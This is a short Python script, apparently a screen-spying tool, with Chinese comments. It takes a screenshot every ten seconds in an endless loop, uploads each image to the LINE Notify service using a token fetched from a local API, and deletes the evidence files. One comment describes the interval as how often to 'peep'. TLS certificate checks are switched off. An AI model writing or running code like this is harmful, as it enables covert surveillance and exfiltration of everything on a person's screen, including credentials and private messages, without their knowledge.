import pyautogui, time
import requests
import os
import urllib3
urllib3.disable_warnings()

i = 1

r = requests.get("https://localhost:7084/api/PrtSc/GetPrtSc", verify=False)
r_json = r.json()
token = r_json['token']
print(r_json)
print(r_json['status'], token)


while True:
    pyautogui.screenshot('screenshot-'+ str(i) +'.png') # 自動截圖
    print('screenshot-'+ str(i) +'.png SAVED!.')
    
    headers = {
            "Authorization": "Bearer " + token,
        }
     
    params = {"message": "success",  # 傳訊息，這邊設定傳success
    }
    
    files = {'imageFile': open(r'screenshot-'+ str(i) +'.png','rb')} # 傳圖片檔案

    r = requests.post("https://notify-api.line.me/api/notify",
                      headers=headers, params=params, files = files)

    fileTest = "screenshot-"+ str(i-1) +".png" # 因為照片在傳出去的時候會鎖死刪不掉，所以要刪前一個檔案
    try: # 防止找不到檔案導致程式停止
        os.remove(fileTest) # 刪除截圖的圖片檔案
        print('刪除')
    except OSError as e:
        print(e) # 印出錯誤訊息   

    time.sleep(10) #看你要幾秒鐘偷窺一次

    
    i = i + 1

